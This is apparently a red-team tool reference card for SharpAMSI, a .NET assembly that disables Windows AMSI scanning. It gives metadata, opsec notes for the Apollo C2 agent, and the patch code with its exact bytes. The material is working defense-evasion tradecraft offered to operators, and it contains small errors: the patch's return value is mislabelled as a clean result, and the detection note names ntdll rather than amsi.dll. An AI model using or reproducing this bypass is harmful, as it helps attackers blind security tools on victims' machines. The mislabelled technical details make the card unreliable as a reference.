---
name: SharpAMSIBypass
category: defense-evasion
subcategories: [amsi-bypass, dotnet, reflection, inline-assembly]
tradecraft_tags: [amsi, bypass, dotnet, reflection, apollo-runnable, inline-assembly]
mitre_attack:
  - id: T1562.001
    name: Impair Defenses — Disable or Modify Tools
source:
  url: https://github.com/matterpreter/OffensiveCSharp/tree/master/AmsiScanBuffer
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: SharpAMSI.exe
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  Patching AmsiScanBuffer via .NET reflection is detectable by kernel-level EDR that
  monitors memory writes to ntdll regions (CrowdStrike, SentinelOne with kernel modules).
  The patch itself may be caught before it applies in hardened environments.
usage_examples:
  - description: Patch AMSI via .NET reflection (Apollo inline_assembly context)
    args: "SharpAMSI.exe"
  - description: "Apollo: AMSI is already bypassed by inline_assembly — SharpAMSI not needed"
    args: "(Apollo's AppDomain loader handles AMSI bypass automatically)"
opsec_notes: |
  For Apollo inline_assembly, AMSI bypass is already performed by Apollo's loader —
  SharpAMSI is not needed for .NET assembly execution via Apollo. SharpAMSI is useful
  for PowerShell-context AMSI bypass when loaded and executed via Apollo's
  powershell_import channel (though Apollo may handle this differently).
gotchas: |
  Apollo handles AMSI bypass for inline_assembly internally — you do NOT need to
  load SharpAMSI before running other tools via inline_assembly. SharpAMSI is
  relevant only when executing PowerShell commands that would otherwise be AMSI-scanned.
  Review Apollo's documentation for its built-in AMSI bypass approach.
related_ttps: [amsi-bypass, etw-patching-bof, invoke-obfuscation]
alternatives: [apollo-builtin-amsi, powershell-reflection-bypass]
common_args: {}
last_updated: 2026-05-29
---

# SharpAMSI / AMSI Bypass via .NET

A .NET assembly that patches AMSI's `AmsiScanBuffer` function to always return
AMSI_RESULT_CLEAN. This allows subsequent PowerShell commands and script loading to
bypass AMSI scanning in the current process.

## When to Use

```
Apollo inline_assembly:
  AMSI is ALREADY bypassed by Apollo's loader → SharpAMSI NOT needed
  
Apollo powershell_import:
  AMSI may still apply to the PowerShell session
  Consider: run SharpAMSI via inline_assembly FIRST, then powershell_import

Standalone execution (not via Apollo):
  SharpAMSI disables AMSI for the current PowerShell/process session
```

## The Patch

```csharp
// What SharpAMSI does internally:
var amsi = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
VirtualProtect(amsi, patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
Marshal.Copy(patch, 0, amsi, patch.Length);  // patch = {0xB8,0x57,0x00,0x07,0x80,0xC3}
// Returns AMSI_RESULT_CLEAN (0x80070057) from all subsequent AMSI scans
```

## Apollo Context Note

Apollo's inline_assembly is NOT PowerShell — it loads .NET assemblies into a
disposable AppDomain where the CLR context doesn't have AMSI hooked in the same
way PowerShell's runspace does. Apollo's loader specifically handles this.
